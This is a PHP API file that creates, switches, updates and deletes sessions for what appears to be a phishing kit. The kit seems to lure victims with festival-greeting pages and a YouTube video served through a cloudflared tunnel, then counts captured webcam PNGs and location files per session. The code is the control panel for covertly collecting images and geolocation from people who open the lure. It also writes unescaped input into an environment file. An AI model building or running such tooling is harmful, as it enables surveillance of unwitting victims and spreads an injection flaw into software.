<?php
header('Content-Type: application/json');

$sessionsFile = '/data/config/sessions.json';
$method = $_SERVER['REQUEST_METHOD'];
$input = json_decode(file_get_contents('php://input'), true) ?? [];

function loadSessions() {
    global $sessionsFile;
    if (!file_exists($sessionsFile)) {
        $default = ['sessions' => [], 'active' => ''];
        file_put_contents($sessionsFile, json_encode($default), LOCK_EX);
        return $default;
    }
    return json_decode(file_get_contents($sessionsFile), true) ?? ['sessions' => [], 'active' => ''];
}

function saveSessions($data) {
    global $sessionsFile;
    file_put_contents($sessionsFile, json_encode($data, JSON_PRETTY_PRINT), LOCK_EX);
}

function countCaptures($sessionName) {
    $dir = '/data/captures/';
    if (!is_dir($dir)) return 0;
    $count = 0;
    foreach (scandir($dir) as $f) {
        if (strpos($f, $sessionName) === 0 && preg_match('/\.png$/i', $f)) $count++;
    }
    return $count;
}

function countLocations($sessionName) {
    $dir = '/data/locations/';
    if (!is_dir($dir)) return 0;
    $count = 0;
    foreach (scandir($dir) as $f) {
        if (strpos($f, $sessionName) === 0 && preg_match('/\.txt$/i', $f)) $count++;
    }
    return $count;
}

switch ($method) {
    case 'GET':
        $data = loadSessions();
        foreach ($data['sessions'] as $id => &$s) {
            $s['capture_count'] = countCaptures($id);
            $s['location_count'] = countLocations($id);
        }
        echo json_encode($data);
        break;

    case 'POST':
        $action = $input['action'] ?? '';
        $data = loadSessions();

        if ($action === 'create') {
            $name = trim($input['name'] ?? '');
            if (empty($name)) {
                http_response_code(400);
                echo json_encode(['error' => 'Session name required']);
                exit;
            }
            $id = preg_replace('/[^a-z0-9_-]/', '', strtolower($name)) . '-' . substr(bin2hex(random_bytes(4)), 0, 8);
            if (isset($data['sessions'][$id])) {
                http_response_code(409);
                echo json_encode(['error' => 'Session ID collision, retry']);
                exit;
            }
            $data['sessions'][$id] = [
                'name' => $name,
                'template' => $input['template'] ?? 1,
                'festival_name' => $input['festival_name'] ?? 'NewYear',
                'youtube_id' => $input['youtube_id'] ?? 'dQw4w9WgXcQ',
                'tunnel' => $input['tunnel'] ?? 'cloudflared',
                'watermark_enabled' => $input['watermark_enabled'] ?? true,
                'webrtc_enabled' => $input['webrtc_enabled'] ?? true,
                'created_at' => date('c'),
                'status' => 'active',
                'capture_count' => 0,
                'location_count' => 0
            ];
            if (empty($data['active'])) {
                $data['active'] = $id;
            }
            saveSessions($data);
            echo json_encode(['status' => 'created', 'id' => $id, 'session' => $data['sessions'][$id]]);

        } elseif ($action === 'switch') {
            $id = $input['id'] ?? '';
            if (!isset($data['sessions'][$id])) {
                http_response_code(404);
                echo json_encode(['error' => 'Session not found']);
                exit;
            }
            $data['active'] = $id;
            $data['sessions'][$id]['status'] = 'active';
            saveSessions($data);

            $sessionEnv = "/data/config/session.env";
            $s = $data['sessions'][$id];
            $lines = [
                "SESSION_NAME={$id}",
                "DEFAULT_TEMPLATE={$s['template']}",
                "FESTIVAL_NAME={$s['festival_name']}",
                "YOUTUBE_VIDEO_ID={$s['youtube_id']}",
                "WATERMARK_ENABLED=" . ($s['watermark_enabled'] ? 'true' : 'false'),
                "WEBRTC_ENABLED=" . ($s['webrtc_enabled'] ? 'true' : 'false'),
            ];
            file_put_contents($sessionEnv, implode("\n", $lines) . "\n", LOCK_EX);

            echo json_encode(['status' => 'switched', 'active' => $id]);

        } elseif ($action === 'delete') {
            $id = $input['id'] ?? '';
            if (!isset($data['sessions'][$id])) {
                http_response_code(404);
                echo json_encode(['error' => 'Session not found']);
                exit;
            }
            unset($data['sessions'][$id]);
            if ($data['active'] === $id) {
                $remaining = array_keys($data['sessions']);
                $data['active'] = !empty($remaining) ? $remaining[0] : '';
            }
            saveSessions($data);
            echo json_encode(['status' => 'deleted', 'active' => $data['active']]);

        } elseif ($action === 'update') {
            $id = $input['id'] ?? '';
            if (!isset($data['sessions'][$id])) {
                http_response_code(404);
                echo json_encode(['error' => 'Session not found']);
                exit;
            }
            $allowed = ['template', 'festival_name', 'youtube_id', 'tunnel', 'watermark_enabled', 'webrtc_enabled'];
            foreach ($allowed as $key) {
                if (isset($input[$key])) {
                    $data['sessions'][$id][$key] = $input[$key];
                }
            }
            saveSessions($data);
            echo json_encode(['status' => 'updated', 'session' => $data['sessions'][$id]]);

        } else {
            http_response_code(400);
            echo json_encode(['error' => 'Unknown action: ' . $action]);
        }
        break;

    default:
        http_response_code(405);
        echo json_encode(['error' => 'Method not allowed']);
}
